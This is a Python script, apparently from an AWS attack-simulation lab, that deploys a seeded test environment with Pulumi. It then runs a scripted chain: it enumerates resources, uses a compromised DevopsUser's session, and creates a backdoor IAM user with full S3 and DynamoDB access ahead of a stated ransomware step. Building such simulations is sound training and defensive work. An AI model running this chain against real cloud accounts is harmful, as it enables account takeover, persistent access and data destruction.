import os
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
import Functions
from Helpers import loading_animation
import pyqrcode
from clean_up import full_cleanup
import boto3
from attack import Attack
from MFA import MFASetup


# Initialize AWS Clients
iam_client = boto3.client("iam")
sts_client = boto3.client("sts")

PULUMI_OUTPUT_PATH = "/workspaces/Pulumi/Infra/forrester-2025-output.json"

# Define user and initial MFA ARN (this may be empty initially)
user = "DevopsUser"
mfa_arn = ""

# Create MFASetup instance with required parameters
mfa = MFASetup(user, mfa_arn, iam_client, sts_client, PULUMI_OUTPUT_PATH)


def forrester_scenario_execute():
    """🚀 Execute Pulumi Deployment for the Forrester 2025 Attack Scenario"""

    print("-" * 30)
    print(colored("Executing Forrester 2025 Scenario: Compromise DevOps User, takeover, priv escalation, perform ransomware on S3 & DynamoDB", color="red"))
    loading_animation()
    print("-" * 30)

    print(colored("Rolling out Infrastructure via Pulumi", color="red"))
    loading_animation()
    print("-" * 30)

    file_path = "/workspaces/Pulumi/Infra/forrester-2025-output.json"

    # ✅ Ensure Previous Pulumi Output is Removed
    if os.path.exists(file_path):
        os.remove(file_path)
        print(f"📂 Previous Pulumi output file '{file_path}' found and deleted.")
    else:
        print(f"📂 Pulumi output file '{file_path}' not found, proceeding...")

    # ✅ Execute Pulumi Deployment
    # Change current working directory to 'Infra'
    os.chdir("/workspaces/Pulumi/Infra/")
    subprocess.call("pulumi up -s dev -y", shell=True)

    # ✅ Capture Pulumi Stack Output
    subprocess.call("pulumi stack -s dev output --json > /workspaces/Pulumi/Infra/forrester-2025-output.json", shell=True)
    print("📂 Pulumi output saved inside /workspaces/Pulumi/Infra/forrester-2025-output.json")




def forrester_scenario_validate_rollout():
    """🔍 Validate that Pulumi successfully deployed all resources"""

    Functions.wait_for_output_file()
    Functions.validate_pulumi_outputs_after_rollout(pulumi_stack_output_file="/workspaces/Pulumi/Infra/forrester-2025-output.json")




def forrester_scenario_validate_data():
    """🔍 Validate that Pulumi-created data exists in S3 and DynamoDB"""

    print("\n🚀 Running Post-Deployment Validation Checks...")

    # ✅ Ensure Pulumi Stack Output is Up to Date
    subprocess.run("pulumi stack -s dev output --json > /workspaces/Pulumi/Infra/forrester-2025-output.json", shell=True)

    # ✅ Load Pulumi Outputs
    with open("/workspaces/Pulumi/Infra/forrester-2025-output.json", "r") as file:
        outputs = json.load(file)

    # ✅ Validate S3 Buckets
    s3_buckets = [
        outputs["config_files_bucket"],
        outputs["customer_data_bucket"],
        outputs["payment_data_bucket"]
    ]

    for bucket in s3_buckets:
        validation_cmd = f"aws s3 ls s3://{bucket} --region us-east-1"
        result = subprocess.run(validation_cmd, shell=True, capture_output=True, text=True)

        if result.stdout:
            print(f"✅ S3 Validation Passed: Data exists in bucket {bucket}")
        else:
            print(f"❌ ERROR: No data found in {bucket}")

    # ✅ Validate DynamoDB Tables
    dynamodb_tables = ["CustomerOrdersTable", "CustomerSSNTable"]

    for table in dynamodb_tables:
        validation_cmd = f"aws dynamodb scan --table-name {outputs[table]} --region us-east-1 --limit 1"
        result = subprocess.run(validation_cmd, shell=True, capture_output=True, text=True)

        if '"Items"' in result.stdout:
            print(f"✅ DynamoDB Validation Passed: Records found in {outputs[table]}")
        else:
            print(f"❌ ERROR: No records found in {outputs[table]}")

    print("\n🚀 Post-Deployment Data Validation Complete!")





def ensure_pulumi_deployment():
    """🚀 Ensures Pulumi infrastructure is deployed before Attack initialization"""
    
    print("🚀 Starting Infrastructure Deployment...")

    print("\n🔍 Executing Pulumi Deployment...")
    forrester_scenario_execute()

    print("\n🔍 Validating Rollout...")
    forrester_scenario_validate_rollout()

    print("\n🔍 Validating Data...")
    forrester_scenario_validate_data()

    # ✅ Wait for the Pulumi output file to be generated
    # timeout = 60  # Max 60 seconds
    # elapsed = 0
    # while not os.path.exists(PULUMI_OUTPUT_PATH) and elapsed < timeout:
    #     time.sleep(3)
    #     elapsed += 3

    if not os.path.exists(PULUMI_OUTPUT_PATH):
        raise RuntimeError(f"❌ ERROR: Pulumi output file '{PULUMI_OUTPUT_PATH}' still not found after deployment.")

    print("\n✅ Pulumi Deployment Verified! Proceeding...\n")

    # ✅ Let MFA fully register before trying to login
    Functions.progress_bar(seconds=15)






if __name__ == "__main__":
    # print("Starting Infrastructure Deployment...")


    # print("\n\n\n") 
    # print("Executing Pulumi Deployment...")
    # print("\n\n\n")
    # forrester_scenario_execute()

    # print("\n\n\n") 
    # print("Validating Rollout...")
    # print("\n\n\n")
    # forrester_scenario_validate_rollout()

    # print("\n\n\n") 
    # print("Validating Data Population Within Infrastructure for EC2 & DynamoDB")
    # print("\n\n\n")
    # forrester_scenario_validate_data()


    # print("\n\n\n") 
    # print("Setting up MFA for DevOpsUser and getting a session token")
    # print("\n\n\n")
    # mfa.setup_mfa_and_login()


    print("\n\n\n") 
    print("Enumerating on all AWS resoureces and saving to ./AWS_Emumeration")
    print("\n\n\n") 
    attack = Attack()
    attack.enumeration.run_all_enumerations()
    



    #  
    #################################
    ### Boto3 Session with DevopsUser
    #################################
    print("\n\n\n") 
    print(f"Initializing boto3 session with: {user}")
    print("\n\n\n") 
    user_session = boto3.Session(
        aws_access_key_id=mfa.accesskey_ID,
        aws_secret_access_key=mfa.secret_access_key,
        aws_session_token=mfa.session_token,
        region_name="us-east-1"
    )

    #####################################################
    ### DevopsUser creating Ransomware user, access keys
    ### &  attaching AWS s3/Dynamodb all access policies
    #####################################################
    attack_vector = attack.AWS_CreateUser_AttachPolicies(user_session)
    attack_vector.run_pipeline(
        username="run_while_u_can", 
        policy_arns=[
            "arn:aws:iam::aws:policy/AmazonDynamoDBFullAccess",
            "arn:aws:iam::aws:policy/AmazonS3FullAccess"
        ])



    ########################################
    ### Boto3 Session with run_while_you_can
    ########################################






    # 🚀 Proceed with Attack Scenario
    # print("\n🔥 MFA Phishing Simulated Successfully! Proceeding with Attack...")
    # Here, you will continue the attack scenario.









# def devops_user_MFA_Setup():
#     """🔐 Execute MFA Setup Step-by-Step"""

#     print("\n🚀 Initiating MFA Setup...")

#     attack.mfa.cleanup_old_mfa()  # ✅ Delete any stale MFA devices
#     attack.mfa.create_mfa_device()  # ✅ Create new virtual MFA device
#     attack.mfa.extract_mfa_secret()  # ✅ Extract the MFA seed
#     code1, code2 = attack.mfa.generate_mfa_codes()  # ✅ Generate TOTP MFA codes
#     attack.mfa.enable_mfa(code1, code2)  # ✅ Enable MFA on AWS IAM user
#     print("\n MFA Setup for DevopsUser Successfully Completed!")

